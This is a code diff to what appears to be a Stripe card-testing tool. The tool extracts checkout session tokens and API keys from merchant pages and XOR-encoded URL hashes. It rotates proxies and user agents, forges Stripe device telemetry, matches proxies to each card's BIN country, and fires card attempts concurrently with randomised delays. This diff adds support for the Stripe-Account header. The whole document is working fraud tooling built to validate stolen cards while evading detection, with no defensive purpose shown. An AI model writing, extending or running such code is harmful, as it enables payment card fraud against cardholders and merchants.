@@ -63,12 +63,40 @@ class StripeAPIExtractor:
             match = re.search(pattern, html)
             if match: return match.group(1) if '(' in pattern else match.group(0)
         return None
+
+    @staticmethod
+    def extract_details_from_url_hash(url_str: str) -> dict:
+        res = {'pk_key': None, 'stripe_account': None}
+        if not url_str or '#' not in url_str:
+            return res
+        hash_str = url_str.split('#')[1]
+        decoded = urllib.parse.unquote(hash_str)
+        
+        candidates = [decoded]
+        if decoded.startswith('fidn'):
+            candidates.append(decoded[4:])
+        
+        for cand in candidates:
+            for pad in ('', '=', '==', '==='):
+                try:
+                    raw_bytes = base64.b64decode(cand + pad)
+                    json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
+                    if '"apiKey"' in json_str or '"stripeAccount"' in json_str:
+                        data = json.loads(json_str)
+                        res['pk_key'] = data.get('apiKey')
+                        res['stripe_account'] = data.get('stripeAccount')
+                        return res
+                except Exception:
+                    pass
+        return res
     
     @staticmethod
-    async def fetch_payment_data(user_id: int, cs_live: str, pk_live: str) -> Dict:
+    async def fetch_payment_data(user_id: int, cs_live: str, pk_live: str, stripe_account: Optional[str] = None) -> Dict:
         try:
             url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
             headers = {"authority": "api.stripe.com", "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "user-agent": random.choice(USER_AGENTS)}
+            if stripe_account:
+                headers["Stripe-Account"] = stripe_account
             data = {"key": pk_live, "eid": "NA", "browser_locale": "en-US", "browser_timezone": "America/New_York", "redirect_type": "url"}
             proxy_data = await ProxyManager.get_random(user_id)
             proxies = None
@@ -819,12 +847,13 @@ class StripeAPIHitter:
         StripeAPIHitter._live_js_hash_cache = "da394b0aef"
         return StripeAPIHitter._live_js_hash_cache
 
-    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None):
+    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None, stripe_account: str = None):
         self.pk_live = pk_live
         self.cs_live = cs_live
         self.proxy_data = proxy_data
         self.raw_amount = raw_amount
         self.locked_email = locked_email
+        self.stripe_account = stripe_account
 
     async def generate_stripe_telemetry(self, profile: dict, proxies: dict, address: dict, page_url: str = None, session=None) -> Dict[str, str]:
         """Generate Stripe device fingerprint tokens via m.stripe.com/6"""
@@ -835,8 +864,7 @@ class StripeAPIHitter:
             country = (address or {}).get('country', 'US')
             # Extract standard 2-letter ISO country code if present
             if len(country) > 2:
-                # address structure sometimes maps full country name, look for 2-letter fallback
-                country = 'US'
+                country = country.upper()[:2]
             tz_offset = tz_map.get(country, -300)
             
             # Map dynamic locales based on proxy country location for better accuracy
@@ -885,6 +913,8 @@ class StripeAPIHitter:
                 "referer": "https://js.stripe.com/",
                 "user-agent": profile['user_agent']
             }
+            if self.stripe_account:
+                tel_headers["Stripe-Account"] = self.stripe_account
             if "sec-ch-ua" in profile:
                 tel_headers["sec-ch-ua"] = profile["sec-ch-ua"]
             if "sec-ch-ua-mobile" in profile:
@@ -925,6 +955,8 @@ class StripeAPIHitter:
             "referer": "https://js.stripe.com/",
             "user-agent": headers.get("user-agent", "")
         }
+        if self.stripe_account:
+            get_headers["Stripe-Account"] = self.stripe_account
         
         for attempt in range(3):
             try:
@@ -1014,6 +1046,8 @@ class StripeAPIHitter:
                     "referer": checkout_page_url,
                     "user-agent": profile["user_agent"]
                 }
+                if self.stripe_account:
+                    headers["Stripe-Account"] = self.stripe_account
                 if "sec-ch-ua" in profile: headers["sec-ch-ua"] = profile["sec-ch-ua"]
                 if "sec-ch-ua-mobile" in profile: headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
                 if "sec-ch-ua-platform" in profile: headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
@@ -1750,25 +1784,17 @@ class ConcurrentHitter:
                     
                     cs_token = StripeAPIExtractor.extract_cs_live(self.url, html)
                     
-                    pk_key = None
-                    hash_idx = self.url.find('#')
-                    if hash_idx != -1:
-                        import urllib.parse, base64, json
-                        hash_str = self.url[hash_idx+1:]
-                        decoded = urllib.parse.unquote(hash_str)
-                        try:
-                            raw_bytes = base64.b64decode(decoded + '==')
-                            json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
-                            data = json.loads(json_str)
-                            pk_key = data.get('apiKey')
-                        except: pass
+                    hash_details = StripeAPIExtractor.extract_details_from_url_hash(self.url)
+                    pk_key = hash_details.get('pk_key')
+                    stripe_account = hash_details.get('stripe_account')
+                    
                     if not pk_key:
                         pk_key = StripeAPIExtractor.extract_pk_live(html)
                         
-                    self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
+                    self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'stripe_account': stripe_account, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
                     
                     if cs_token and pk_key:
-                        api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
+                        api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key, stripe_account=stripe_account)
                         if api_data.get('success'):
                             self.url_info['amount'] = api_data.get('amount')
                             self.url_info['raw_amount'] = api_data.get('raw_amount')
@@ -1807,6 +1833,7 @@ class ConcurrentHitter:
                     # --- Fresh session per card for reusable links ---
                     cs_token = self.url_info['cs_token']
                     pk_key = self.url_info['pk_key']
+                    stripe_account = self.url_info.get('stripe_account')
                     raw_amount = self.url_info.get('raw_amount')
                     locked_email = self.url_info.get('locked_email')
                     
@@ -1816,9 +1843,11 @@ class ConcurrentHitter:
                         if fresh:
                             cs_token = fresh['cs_token']
                             pk_key = fresh['pk_key']
+                            if fresh.get('stripe_account'):
+                                stripe_account = fresh['stripe_account']
                             # Re-fetch payment data for the fresh session to get correct amount
                             try:
-                                api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
+                                api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key, stripe_account=stripe_account)
                                 if api_data.get('success'):
                                     raw_amount = api_data.get('raw_amount') or raw_amount
                                     locked_email = api_data.get('locked_email') or locked_email
@@ -1826,7 +1855,7 @@ class ConcurrentHitter:
                                 pass
                     
                     proxy_data = await ProxyManager.get_geo_matched(self.user_id, bin_country) if bin_country else await ProxyManager.get_random(self.user_id)
-                    hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email)
+                    hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email, stripe_account=stripe_account)
                     
                     import random
                     await asyncio.sleep(random.uniform(0.05, 0.2))  # Micro-random delay per card attempt  
